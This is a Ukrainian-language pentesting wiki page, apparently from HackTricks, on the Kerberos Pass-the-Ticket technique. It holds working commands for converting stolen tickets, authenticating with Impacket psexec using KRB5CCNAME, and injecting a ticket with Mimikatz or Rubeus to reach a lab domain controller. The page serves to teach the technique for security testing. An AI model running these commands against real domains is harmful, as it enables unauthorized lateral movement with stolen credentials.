# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Огляд

В атаці Pass-the-Ticket (PtT) зловмисник використовує викрадений Kerberos ticket для автентифікації як principal цього ticket без володіння паролем відповідного облікового запису. Ticket-granting ticket (TGT) можна використовувати для запиту service tickets, тоді як викрадений service ticket обмежений цільовим сервісом і періодом дії.<sup>[[1]](#references)</sup>

Методи отримання ticket див. у:

- [Збір ticket у Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Збір ticket у Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Перетворення форматів ticket у Linux і Windows

Kerberos-кеші зазвичай представлені як MIT-файли `ccache` у Linux і файли `.kirbi` у Windows. `ticket_converter` перетворює ці формати, використовуючи вхідний ticket і шлях до вихідного файлу.<sup>[[2]](#references)</sup>
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```
Kekeo також надає інструменти для роботи з Kerberos tickets у Windows.<sup>[[3]](#references)</sup>

## Використання ticket

У Linux вкажіть `KRB5CCNAME` на cache і налаштуйте клієнт Impacket використовувати Kerberos без запиту пароля:<sup>[[4]](#references)</sup>
```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
У Windows Mimikatz або Rubeus можуть імпортувати квиток `.kirbi` до поточного сеансу входу. Використовуйте `klist`, щоб перевірити отриманий кеш.<sup>[[5]](#references)[[6]](#references)</sup>
```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
Імпорт ticket не надає привілеїв, що виходять за межі представлених у ticket і політики авторизації цільового сервісу. Прострочені, відкликані, неправильно сформовані або неправильно обмежені за областю дії ticket можуть не спрацювати.<sup>[[1]](#references)</sup>

Для ширшого контексту атак на Kerberos і пов’язаних технік отримання ticket див. посібник Tarlogic з атак на Kerberos.<sup>[[7]](#references)</sup>

## References

- [1] [MITRE ATT&CK T1550.003 - Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - приклади Impacket](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - техніки атак на Kerberos](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
{{#include ../../banners/hacktricks-training.md}}
